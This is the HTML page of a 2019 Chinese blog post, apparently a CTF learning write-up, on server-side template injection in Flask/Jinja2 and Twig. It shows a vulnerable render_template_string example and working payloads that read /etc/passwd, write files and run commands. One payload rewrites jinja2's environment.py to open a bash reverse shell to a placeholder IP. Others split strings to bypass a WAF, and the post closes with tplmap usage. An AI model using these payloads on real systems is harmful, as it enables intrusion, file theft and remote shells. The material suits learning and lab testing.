@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="blog">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          服务端模板注入(SSTI攻击) - CoCo1er&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2019/04/12/服务端模板注入-SSTI攻击/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('')
+                /*post*/
+            
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#-SSTI" title="-SSTI">-SSTI</a>
+                            
+                        </div>
+                        <h1>服务端模板注入(SSTI攻击)</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by CoCo1er on
+                            2019-04-12
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">2.3k</span> and
+                                Reading Time <span class="post-count">10</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">CoCo1er&#39;s blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/photography/">Photography</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="模板注入（SSTI）"><a href="#模板注入（SSTI）" class="headerlink" title="模板注入（SSTI）"></a>模板注入（SSTI）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近刷题刷到SSTI的题，最初死活找不到入题思路，后续看了WP才找到切入点，想起来自己之前挖的坑…SSTI的原理还是需要好好总结一下的。</p>
+<p>​    By the way..文章后部分有例题</p>
+<h1 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​    SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的，目前CTF常见的SSTI题中，大部分是考python的。</p>
+<p>​    什么是模板？说实话上学期每周练做题的时候我也不懂。前一阵子接触了Django，稍微了解了一些web开发，可算知道模板是什么了，对SSTI理解也更清晰了些。简单说一下：</p>
+<p>​    web开发采用MVC/MTC模式，可以理解为数据库 、模板文件 、业务处理，简单的可以这么描述，用户在url里输入了某种路径，即请求了某种业务，然后web服务器通过返回模板，模板中对数据进行填充就得到了用户应该看到的html源码。如下为一种简单模板：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;&#x2F;head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Hello, &#123;&#123;user&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;&#x2F;body&gt;</span><br><span class="line">    &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>​    开发环境中数据不可能写成静态，于是就采用模板来实现，即通过传参title、user等可以将模板中的title、user 替换成相应内容。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    模板注入怎么形成？看一个简单例子：（render_template_string）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">    from flask import render_template</span><br><span class="line">    from flask import request</span><br><span class="line">    from flask import render_template_string</span><br><span class="line">    app &#x3D; Flask(__name__)</span><br><span class="line">    @app.route(&#39;&#x2F;test&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">    def test():</span><br><span class="line">        template &#x3D; &#39;&#39;&#39;</span><br><span class="line">            &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">                &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">            &lt;&#x2F;div&gt; </span><br><span class="line">        &#39;&#39;&#39; %(request.url)</span><br><span class="line">return render_template_string(template)</span><br><span class="line">    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">        app.debug &#x3D; True</span><br><span class="line">        app.run()</span><br></pre></td></tr></table></figure>
+<p>​    代码将我们的url填入html代码中，如果我们此时在url中填入了&#123;&#123; &#125;&#125;就可以导致SSTI注入。</p>
+<p>​    而如果我们使用render_template函数。即模板是先写好的，此时就不能注入了，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">    @app.route(&#39;&#x2F;index&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])#我们访问&#x2F;或者&#x2F;index都会跳转</span><br><span class="line">    def index():</span><br><span class="line">       return render_template(&quot;index.html&quot;,title&#x3D;&#39;Home&#39;,user&#x3D;request.args.get(&quot;key&quot;))</span><br><span class="line"></span><br><span class="line">index.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;title&gt;&#123;&#123;title&#125;&#125; &lt;&#x2F;title&gt;</span><br><span class="line">      &lt;&#x2F;head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Hello, &#123;&#123;user&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;&#x2F;body&gt;</span><br><span class="line">    &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>​    再来几个例子帮助理解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;]));  &#x2F;&#x2F; 将用户输入作为模版变量的值</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
+<p>​    使用 Twig 模版引擎渲染页面，其中模版含有 name} 变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p>
+<p>​    但是如果渲染的模板内容受到用户控制就会引发漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output &#x3D; $twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);  &#x2F;&#x2F; 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
+<p>这时候传入JS是可以被执行的</p>
+<p>参考:</p>
+<ul>
+<li><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></li>
+<li><a href="https://www.jianshu.com/p/aef2ae0498df" target="_blank" rel="noopener">https://www.jianshu.com/p/aef2ae0498df</a></li>
+<li><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a></li>
+<li><a href="https://www.jianshu.com/p/367ea79c5482" target="_blank" rel="noopener">https://www.jianshu.com/p/367ea79c5482</a></li>
+</ul>
+<h3 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h3><p><img src="/服务端模板注入-SSTI攻击/pic1.png" alt=""></p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>​    试想一下，在一个python文件里，传入的模板受用户控制，那么我们就可以通过某些方法在此受限的环境里构造出能实现文件读取类似的代码并执行。</p>
+<p>如下：通过python 内置函数，列出一个模组/类/对象来实现函数调用</p>
+<p><strong>函数解析</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的参数类型</span><br><span class="line">__bases__ 返回类型列表</span><br><span class="line">__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组</span><br><span class="line">__subclasses__() 返回object的子类</span><br><span class="line">__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></pre></td></tr></table></figure>
+<p><strong>获取基本类</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</span><br></pre></td></tr></table></figure>
+<p><img src="/服务端模板注入-SSTI攻击/pic2.png" alt=""></p>
+<p>获取基本类后，继续向下获取基本类(object)的子类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()</span><br></pre></td></tr></table></figure>
+<p><img src="/服务端模板注入-SSTI攻击/pic3.png" alt=""></p>
+<p>我们可以看到object的子类很多，找到我们能用的一些类，就可以实现构造”恶意函数“了。</p>
+<p>关于mro和subclasses，参考: <a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>
+<p>​    网上翻了许多博客和技术文章，看到了许多payload，这里就简单列举两个常用的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0] </span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#读文件： .__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() </span><br><span class="line">#写文件： .__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) </span><br><span class="line">#查看目录 __import__.__getattribute__(&#39;__clo&#39;+&#39;sure__&#39;)[0].cell_contents(&#39;o&#39;+&#39;s&#39;).__getattribute__(&#39;sy&#39;+&#39;stem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br></pre></td></tr></table></figure>
+<p>在这里[40]索引到的是“&lt;type ‘file’ &gt; ”</p>
+<p>之前刷题遇到的坑：python2、python3不同环境执行的payload不同：</p>
+<p><strong>python2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注入变量执行命令详见 http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;98928.html </span><br><span class="line">#读文件： &#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125; </span><br><span class="line">#写文件： &#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    flask 默认用的jinja2模板语言。也可以通过写jinja2的environment.py执行命令; jinja2的模板会load这个module，而且这个environment.py import了os模块, 所以只要能写这个文件，就可以执行任意命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#假设在&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;jinja2&#x2F;environment.py, 弹一个shell</span><br><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;jinja2&#x2F;environment.py&#39;).write(&quot;\nos.system(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[IP_ADDR]&#x2F;[PORT] 0&gt;&amp;1&#39;)&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>python3</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#命令执行： &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">#文件操作 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>python3 利用 <strong>globals</strong>[‘<strong>builtins </strong>‘]的一种姿势：</p>
+<p>参考：<a href="http://www.ee50.com/ld/940.html" target="_blank" rel="noopener">http://www.ee50.com/ld/940.html</a></p>
+<h3 id="详细payload-绕过"><a href="#详细payload-绕过" class="headerlink" title="详细payload/绕过"></a>详细payload/绕过</h3><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8</a></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ol>
+<li><p>自己随手git了一个SSTI攻击的靶场，link : <a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p>payload :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;your command&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/服务端模板注入-SSTI攻击/pic4.png" alt=""></p>
+<p>​    同样也可以在这个靶场测试一下各种payload，根据环境的不同，有时候payload不一定有效，重要的是学会这样一种”构造“方法，可以在python cmd里去多试试那些内置模块。</p>
+<ol>
+<li><p>最近刷题刷到的那个题。不难，太菜看不出。。</p>
+<p>（ 页面源代码中给出了flag所在 ）</p>
+</li>
+</ol>
+<p><img src="/服务端模板注入-SSTI攻击/pic5.png" alt=""></p>
+<p>其实注入发生在url中，主要是waf有点麻烦，绕的有点多。</p>
+<p>执行命令是这一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.class.mro[2].subclasses()40.read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>绕完waf是这一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[&#39;__cla&#39;+&#39;ss__&#39;][&#39;__mr&#39;+&#39;o__&#39;][2][&#39;__subcla&#39;+&#39;sses__&#39;]()[40](&#39;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;).next()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    <strong>绕过姿势++</strong> （用[ ]括起来代替‘点’，字符串分开写再拼接，<strong>file.next()</strong> 方法在文件使用迭代器时会使用到，在循环中，next()方法会在每次循环中调用，该方法返回文件的下一行，如果到达结尾(EOF),则触发 <em>StopIteration</em>）</p>
+<ol>
+<li>原来有写过沙盒绕过的题，原理也类似，可以自己去复现一下。（有空再补吧…AWSL）</li>
+</ol>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>SSTI注入也有工具可以使用——tplmap</p>
+<p><strong>获取:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br></pre></td></tr></table></figure>
+<p><strong>运行实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tplmap.py -u &lt;url&gt;</span><br></pre></td></tr></table></figure>
+<p>这个工具对于没有waf的，比如自己搭的那个简单的靶场里的完全可以直接一键式操作，如下图</p>
+<p><img src="/服务端模板注入-SSTI攻击/pic6.png" alt=""></p>
+<p>​    对于那个有waf的，工具是可以检测出来存在注入的，不过没有能直接用的功能，如上图这些，这就需要我们去fuzz然后手工注入了。</p>
+<p>参考 ：<a href="https://host.zzidc.com/xnkj/1676.html" target="_blank" rel="noopener">https://host.zzidc.com/xnkj/1676.html</a></p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/08/25/CTP2019-贵阳英才计划集训总结/" data-toggle="tooltip" data-placement="top" title="CTP2019-贵阳英才计划集训总结">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/04/hexo主题自定义样式/" data-toggle="tooltip" data-placement="top" title="hexo主题自定义样式">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#-SSTI" title="-SSTI">-SSTI</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="https://blog.csdn.net/d_Nail" target="_blank">Dusign&#39;s Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">Dusign&#39;s Web</a></li>
+                    
+                        <li><a href="https://github.com/dusign" target="_blank">Dusign&#39;s Github</a></li>
+                    
+                        <li><a href="#" target="_blank">Other</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; CoCo1er 2020 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
